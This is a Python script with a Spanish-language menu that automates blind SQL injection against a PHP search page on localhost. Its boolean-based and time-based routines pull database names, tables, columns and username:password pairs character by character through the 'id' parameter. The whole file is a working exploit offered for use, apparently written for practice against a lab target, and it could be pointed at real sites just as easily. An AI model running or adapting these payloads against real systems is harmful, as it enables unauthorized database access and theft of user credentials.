#!/usr/bin/python3

import requests
import signal
import sys
import time
import string
from pwn import *



def main():
    while True:
        mostrar_menu()
        opcion = input("Selecciona una opción (1-4): ")

        if opcion == "1":
            makeSQLI()
        elif opcion == "2":
            mostrarDB()
        elif opcion == "3":
            mostrarTablas()
        elif opcion == "4":
            mostrarColumnas()
        elif opcion == "5":
            basadaEnTiempo()
            break
        elif opcion == "6":
            print ("Hasta Luego!!")
            break


        else:
            print("Opción no válida. Inténtalo de nuevo.")

def mostrarDB():
    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)

    p2 = log.progress("Datos extraidos")

    extracted_info = ""

    for position in range(1,150):
        for character in range(33, 126):
            sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id=1)=%d)" %(position, character)
           
            p1.status(sqli_url)

            r = requests.get(sqli_url)

            if r.status_code == 200:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break
 
 
 
def basadaEnTiempo():
     p1 = log.progress("Fuerza Bruta")
     p1.status("Iniciando proceso de fuerza bruta")
     time.sleep(2)
 
     p2 = log.progress("Datos extraidos")
 
     extracted_info = ""
 
     for position in range(1,150):
         for character in range(33, 126):
             sqli_url = main_url + "?id=9 or if(ascii(substr((select group_concat(username,0x3a,password) from users),%d,1))=%d,sleep(0.35),1)" %(position, character)
            
             p1.status(sqli_url)
 
             time_start = time.time()
 
             r = requests.get(sqli_url)
             
             time_end = time.time()
 
             if time_end - time_start > 0.35:
                 extracted_info += chr(character)
                 p2.status(extracted_info)
                 break
 
 
 
 
 
def mostrarTablas():
     p1 = log.progress("Fuerza Bruta")
     p1.status("Iniciando proceso de fuerza bruta")
     time.sleep(2)
 
     p2 = log.progress("Datos extraidos")
 
     extracted_info = ""
 
     for position in range(1,150):
         for character in range(33, 126):
             sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema=char(104,97,99,107,52,117)),%d,1)))=%d)" %(position, character)
            
             p1.status(sqli_url)
 
             r = requests.get(sqli_url)
 
             if r.status_code == 200:
                 extracted_info += chr(character)
                 p2.status(extracted_info)
                 break
 
 
def mostrarColumnas():
     p1 = log.progress("Fuerza Bruta")
     p1.status("Iniciando proceso de fuerza bruta")
     time.sleep(2)
 
     p2 = log.progress("Datos extraidos")
 
     extracted_info = ""
 
     for position in range(1,150):
         for character in range(33, 126):
             sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema=char(104,97,99,107,52,117) and table_name=char(117,115,101,114,115)),%d,1)))=%d)" %(position, character)
  
             p1.status(sqli_url)
 
             r = requests.get(sqli_url)
 
             if r.status_code == 200:
                 extracted_info += chr(character)
                 p2.status(extracted_info)
                 break
 
 
 
 
 
 
 
def mostrar_menu():
     print("\nMenú de opciones:")
     print("1. Mostrar usuarios y contraseñas")
     print("2. Enumerar Bases de datos existentes")
     print("3. Motrar Tablas")
     print("4. Mostrar Columnas")
     print("5. Basado en tiempo")
     print ("6. Salir")
 
 
def def_handler(sig, frame):
     print("\n\n[!] Saliendo...\n")
     sys.exit(1)
 
 
 
 # Ctrl+C
signal.signal(signal.SIGINT, def_handler)
 
 #variables globales
main_url = "http://localhost/searchUsers.php"
characters = string.printable
resultado = []
def makeSQLI():

    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    time.sleep(2)

    p2 = log.progress("Datos extraidos")

    extracted_info = ""

    for position in range(1,150):
        for character in range(33, 126):
            sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id=1)=%d)" %(position, character)
           
            p1.status(sqli_url)

            r = requests.get(sqli_url)

            if r.status_code == 200:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break



if __name__== '__main__':
   main()


